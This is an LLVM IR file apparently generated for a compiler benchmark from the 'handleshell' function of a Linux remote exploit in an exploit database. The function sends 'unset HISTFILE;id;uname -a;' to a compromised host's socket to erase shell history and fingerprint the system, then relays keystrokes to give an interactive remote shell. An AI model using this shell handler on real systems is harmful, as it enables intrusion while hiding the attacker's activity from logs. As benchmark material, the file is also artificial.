; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1038.c_handleshell.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1038.c_handleshell.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [43 x i8] c" |- enjoy your stay and come back soon ;>\0A\00", align 1
@.str.1 = private unnamed_addr constant [29 x i8] c"unset HISTFILE;id;uname -a;\0A\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@stdout = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @handleshell(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca [2048 x i8], align 16
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  store i32 1, i32* %6, align 4
  %7 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str, i64 0, i64 0))
  %8 = load i32, i32* %2, align 4
  %9 = call i32 @write(i32 %8, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.1, i64 0, i64 0), i32 30)
  br label %10

10:                                               ; preds = %54, %1
  %11 = load i32, i32* %5, align 4
  %12 = icmp ne i32 %11, 0
  br i1 %12, label %13, label %16

13:                                               ; preds = %10
  %14 = load i32, i32* %6, align 4
  %15 = icmp ne i32 %14, 0
  br label %16

16:                                               ; preds = %13, %10
  %17 = phi i1 [ false, %10 ], [ %15, %13 ]
  br i1 %17, label %18, label %55

18:                                               ; preds = %16
  %19 = call i32 @FD_ZERO(i32* %3)
  %20 = call i32 @FD_SET(i32 0, i32* %3)
  %21 = load i32, i32* %2, align 4
  %22 = call i32 @FD_SET(i32 %21, i32* %3)
  %23 = load i32, i32* %2, align 4
  %24 = add nsw i32 %23, 1
  %25 = call i32 @select(i32 %24, i32* %3, i32 0, i32 0, i32 0)
  store i32 %25, i32* %5, align 4
  %26 = load i32, i32* %5, align 4
  %27 = icmp ne i32 %26, 0
  br i1 %27, label %28, label %54

28:                                               ; preds = %18
  %29 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %30 = call i32 @memset(i8* %29, i32 0, i32 2048)
  %31 = load i32, i32* %2, align 4
  %32 = call i64 @FD_ISSET(i32 %31, i32* %3)
  %33 = icmp ne i64 %32, 0
  br i1 %33, label %34, label %42

34:                                               ; preds = %28
  %35 = load i32, i32* %2, align 4
  %36 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %37 = call i32 @read(i32 %35, i8* %36, i32 2047)
  store i32 %37, i32* %6, align 4
  %38 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i8* %38)
  %40 = load i32, i32* @stdout, align 4
  %41 = call i32 @fflush(i32 %40)
  br label %42

42:                                               ; preds = %34, %28
  %43 = call i64 @FD_ISSET(i32 0, i32* %3)
  %44 = icmp ne i64 %43, 0
  br i1 %44, label %45, label %53

45:                                               ; preds = %42
  %46 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %47 = call i32 @read(i32 0, i8* %46, i32 2047)
  store i32 %47, i32* %6, align 4
  %48 = load i32, i32* %2, align 4
  %49 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %50 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %51 = call i32 @strlen(i8* %50)
  %52 = call i32 @write(i32 %48, i8* %49, i32 %51)
  br label %53

53:                                               ; preds = %45, %42
  br label %54

54:                                               ; preds = %53, %18
  br label %10

55:                                               ; preds = %16
  ret i32 1
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i32 @select(i32, i32*, i32, i32, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local i32 @strlen(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
